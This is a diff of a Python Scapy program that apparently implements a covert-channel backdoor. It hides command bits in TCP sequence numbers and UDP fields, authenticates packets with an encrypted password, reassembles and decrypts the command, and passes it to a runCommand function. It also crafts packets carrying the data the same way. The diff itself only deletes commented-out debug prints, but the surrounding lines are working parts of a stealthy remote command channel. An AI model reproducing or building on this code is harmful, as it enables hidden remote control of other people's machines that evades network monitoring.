@@ -95,7 +95,6 @@ def handle(packet):
                 field = packet[TCP].seq
                 #Converts the bits to the nearest divisible by 8
                 covertContent = lengthChecker("TCP",field)
-                # print "binary is " + covertContent
             elif(packet.haslayer(UDP)):
                 length = 16
                 # convert to binary
@@ -111,7 +110,6 @@ def handle(packet):
                 # of 3
                 # If the max has been reached
                 if(checkMessages(UID)):
-                    # print "Max reached, reconstruct command"
                     command = reconstructMessage(UID)
                     command = decrypt(command)
                     #decryptedCommand = decrypt(command)
@@ -148,11 +146,9 @@ def authenticate(packet):
         payload = packet["Raw"].load
         # Decrypt payload, sequence number
         decryptedData = decrypt(payload)
-        # print "Packet payload " + decryptedData
         # Check if password in payload is correct
         password = decryptedData.split("\n")[0]
         #password = payload[0]
-        # print "Password: " + password
         if(password == authentication):
             return True
         else:
@@ -191,14 +187,11 @@ def addToMessages(messages, UID, total, covertContent):
         # then append it to that.
         for x in range(len(messages)):
             if(messages[x][0] == UID):
-                #print "There is an existing element with same UID"
                 messages[x][2].append(covertContent)
                 return;
-                # print messages
             pass
         # If NONE of the elements have the same UID, create a
         # new entry
-        #print "There are no elements with the same UID"
         element = [UID, [int(total)], [covertContent]]
         messages.append(element)
 
@@ -220,13 +213,9 @@ def checkMessages(UID):
     #print(messages)
     for x in range(len(messages)):
         element = messages[x]
-        #print element[0]
         if(element[0] == UID):
-            #print "ELEMENT = UID"
             total = element[1][0]
-            #print "The total amount of messages is " + str(total)
             numMessages = len(element[2])
-            #print "The number of messages is " + str(numMessages)
             if(numMessages == total):
                 return True
     pass
@@ -246,23 +235,18 @@ def checkMessages(UID):
 --      ASCII equivalents to give us a human-readable string.
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def reconstructMessage(UID):
-    #print "Reconstructing command"
     for element in messages:
-        # print element
         text = ""
         if(element[0] == UID):
             data = element[2]
-            #print data
             for value in data:
                 text = text + str(value)
                 pass
-            # print text
             #Split into chunks of 8
             line = text
             n = 8
             chunks = [line[i:i+n] for i in range(0, len(line), n)]
             #Convert each element in array to integer
-            # print "chunks is " + str(chunks)
             for x in range(0, len(chunks)):
                  chunks[x] = int(chunks[x], 2)
                  chunks[x] = chr(chunks[x])
@@ -303,15 +287,12 @@ def runCommand(command):
 --      they are no longer required.
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def deleteMessages(UID):
-    #print "Deleting command with UID " + str(UID)
-    #print "Num of elements is " + str(len(messages));
     for x in range(len(messages)):
         element = messages[x]
         #print element[0]
         if(element[0] == UID):
             del messages[x]
     pass
-    #print "After delete, the lenght is " + str(len(messages))
 
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
@@ -483,9 +464,9 @@ def craftPackets(data,protocol,type):
     #Create a UID to put in every packet, so that we know what session the
     #Packets are part of
     UID = generateUID()
-    #print "The number of messages to send is " + str(len(data))
+    # "The number of messages to send is " + str(len(data))
     while (counter < len(data)):
-        #print str(data[counter])
+        #str(data[counter])
         packets.append(craftPacket(data[counter],protocol,counter+1,len(data),UID,type))
         counter = counter + 1
 
@@ -533,7 +514,6 @@ def craftPacket(data,protocol,position,total,UID,type):
         dstPort = 80
     #print "Crafting packet for # " + str(position) + " / " + str(total)
     if(protocol == "TCP"):
-        #print "Put Data " + str(int(data,2)) + "into Seq Number"
         packet = IP(dst=clientIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
         seq=int(str(data),2))/Raw(load=encrypt(authentication+"\n"+UID+"\n"+str(position)+":" \
         + str(total)))
